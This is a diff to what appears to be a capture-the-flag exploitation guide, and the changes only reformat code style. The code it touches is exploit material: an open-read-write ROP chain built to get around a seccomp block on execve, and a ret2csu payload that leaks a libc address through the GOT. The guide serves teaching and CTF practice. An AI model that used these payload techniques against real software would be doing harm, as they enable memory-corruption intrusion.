@@ -159,7 +159,7 @@ When `execve` is blocked by seccomp but `open`/`read`/`write` are allowed, build
 
 ```python
 # ORW ROP chain skeleton
-rop = b''
+rop = b""
 # open("flag", O_RDONLY)
 rop += p64(pop_rdi) + p64(flag_str_addr)
 rop += p64(pop_rsi_r15) + p64(0) + p64(0)
@@ -183,20 +183,20 @@ rop += p64(pop_rax) + p64(1) + p64(syscall_ret)
 ### Variant: Using csu_init for Indirect Call to GOT
 
 ```python
-csu_pop = elf_base + 0x40123a  # pop rbx..r15; ret
-csu_call = elf_base + 0x401220 # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
+csu_pop = elf_base + 0x40123A  # pop rbx..r15; ret
+csu_call = elf_base + 0x401220  # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
 
-payload = b'A' * offset
+payload = b"A" * offset
 payload += p64(csu_pop)
-payload += p64(0)             # rbx = 0
-payload += p64(1)             # rbp = 1 (skip loop)
-payload += p64(elf.got['write'])  # r12 → call *GOT[write]
-payload += p64(8)             # r13 → rdx = 8 (count)
-payload += p64(elf.got['puts'])   # r14 → rsi = GOT[puts] (leak)
-payload += p64(1)             # r15 → edi = 1 (stdout)
+payload += p64(0)  # rbx = 0
+payload += p64(1)  # rbp = 1 (skip loop)
+payload += p64(elf.got["write"])  # r12 → call *GOT[write]
+payload += p64(8)  # r13 → rdx = 8 (count)
+payload += p64(elf.got["puts"])  # r14 → rsi = GOT[puts] (leak)
+payload += p64(1)  # r15 → edi = 1 (stdout)
 payload += p64(csu_call)
-payload += b'A' * 56          # padding for 7 pops after call
-payload += p64(main_addr)     # return to main
+payload += b"A" * 56  # padding for 7 pops after call
+payload += p64(main_addr)  # return to main
 ```
 
 ### When ret2csu Fails
